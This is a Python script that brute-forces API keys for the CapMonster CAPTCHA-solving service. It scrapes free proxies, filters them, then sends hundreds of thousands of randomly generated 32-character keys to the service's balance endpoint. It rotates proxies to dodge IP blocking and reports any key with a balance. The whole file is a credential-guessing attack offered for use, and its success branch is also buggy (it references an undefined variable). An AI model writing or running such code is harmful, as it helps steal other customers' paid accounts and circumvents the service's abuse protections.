import os, colored, random, string, asyncio, time

from aiohttp import ClientSession
from colorama import Fore, Back

proxies = []
valid_proxies = []

class CapKey():

    def __init__(self, proxy_mode=True):
        get_request = asyncio.run(self.get_proxy())
        for i in get_request.split("\n"): proxies.append(i.replace("\r", ""))

    async def get_proxy(self):
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        t = time.localtime()
        current_time = time.strftime("%H:%M:%S", t)
        grey = colored.fg(242)
        print(f"{grey}{current_time} ({Fore.WHITE}+{grey}) {Fore.BLUE}DBG{Fore.WHITE}   Getting Proxies  {Fore.MAGENTA}proxyscrape.com{Fore.WHITE}\n")
        async with ClientSession() as session:
            resp = await session.get(url)

            return await resp.text()

    async def check_proxies(self, proxy):
        url = "http://ipinfo.io/json"
        try:
            async with ClientSession() as session:
                resp = await session.get(url, proxy=f"http://{proxy}", ssl=False, timeout=5)
                if resp.status == 200:
                    if await resp.json(): valid_proxies.append(proxy)
#                    bal = await repsonse.json()["balance"]
                    t = time.localtime()
                    current_time = time.strftime("%H:%M:%S", t)
                    grey = colored.fg(242)
                    print(f"{grey}{current_time} ({Fore.WHITE}+{grey}) {Fore.YELLOW}INF{Fore.WHITE}   Valid Proxy [{Fore.MAGENTA}{proxy}{Fore.WHITE}]")
                else:
                    pass
        except:
            pass

    async def checker(self):
        tasks = [asyncio.create_task(self.check_proxies(proxy)) for proxy in proxies]

        await asyncio.gather(*tasks)

    def gen_key(self):
        return ''.join(random.choice(string.ascii_lowercase + string.digits + string.digits) for _ in range(32))

    async def check_keys(self, key) -> None:
        url = "https://api.capmonster.cloud/getBalance"
        proxy = random.choice(valid_proxies)

        try:
            async with ClientSession() as session:
                resp = await session.post(url, proxy=f"http://{proxy}", ssl=False, timeout=50, json={"clientKey": key})

                if resp.status == 200:
                    t = time.localtime()
                    b = await resp.json()["balance"]
                    current_time = time.strftime("%H:%M:%S", t)
                    grey = colored.fg(242)
                    print(f"{grey}{current_time} ({Fore.WHITE}+{grey}) {Back.BLUE} ! {Back.RESET}   Valid Key [{Fore.MAGENTA}{key}{Fore.WHITE}] [{balance}]")
                    exit()

                elif "IP" in await resp.text():
                    t = time.localtime()
                    current_time = time.strftime("%H:%M:%S", t)
                    grey = colored.fg(242)
                    print(f"{grey}{current_time} ({Fore.WHITE}-{grey}) {Fore.YELLOW}INF{Fore.WHITE}   Blocked Proxy [{Fore.MAGENTA}{proxy}{Fore.WHITE}]")
                    valid_proxies.remove(proxy)

                elif "ERROR_KEY_DOES_NOT_EXIST" in await resp.text():
                    t = time.localtime()
                    current_time = time.strftime("%H:%M:%S", t)
                    grey = colored.fg(242)
                    print(f"{grey}{current_time} ({Fore.WHITE}+{grey}) {Fore.YELLOW}BAD{Fore.WHITE}   Invalid Key [{Fore.MAGENTA}{key}{Fore.WHITE}]")

        except:
            pass

    async def checker_(self):
        tasks = [asyncio.create_task(self.check_keys(self.gen_key())) for _ in range(5000)]

        await asyncio.gather(*tasks)

os.system("clear || cls")
cap = CapKey()
asyncio.run(cap.checker())

for i in range(50):
    asyncio.run(cap.checker_())
